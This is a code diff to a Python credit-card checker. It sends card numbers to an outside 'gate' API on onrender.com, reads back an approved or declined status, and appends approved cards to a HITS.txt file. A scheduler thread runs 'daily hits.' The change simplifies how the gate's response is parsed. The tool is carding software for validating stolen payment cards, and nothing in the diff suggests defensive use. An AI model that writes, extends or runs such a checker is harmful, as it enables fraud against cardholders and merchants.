@@ -5124,9 +5124,6 @@ scheduler_thread = threading.Thread(target=schedule_daily_hits)
 scheduler_thread.daemon = True
 scheduler_thread.start()
 
-import json
-import requests
-
 def check_sitebase5_cc(cc):
     try:
         # Normalize card
@@ -5177,27 +5174,20 @@ def check_sitebase5_cc(cc):
         # API Call
         url = f"https://site5-eldd.onrender.com/gate=pipeline/key=whoami/cc={formatted_cc.replace('|', '%7C')}"
         response = requests.get(url, timeout=60)
-        raw_data = response.json()
+        result = response.json()
 
-        api_response = raw_data.get('response', '{}')
+        real_status = result.get("status", "DECLINED").upper()
+        real_message = result.get("response", "Unknown response")
 
-        try:
-            parsed = json.loads(api_response)
-            clean_message = parsed.get('error', {}).get('message', 'Unknown response')
-        except Exception:
-            clean_message = 'Unknown response'
-
-        # Detect success
-        status = 'DECLINED'
-        if any(x in clean_message.lower() for x in ["approved", "success", "live"]):
-            status = 'APPROVED'
-            with open('HITS.txt', 'a') as hits:
-                hits.write(formatted_cc + '\n')
+        # Write HITS if approved
+        if real_status == "APPROVED":
+            with open("HITS.txt", "a") as f:
+                f.write(formatted_cc + "\n")
 
         return {
-            'status': status,
+            'status': real_status,
             'card': formatted_cc,
-            'message': clean_message,
+            'message': real_message,
             'brand': brand,
             'country': f"{country_name} {country_flag}",
             'type': card_type,
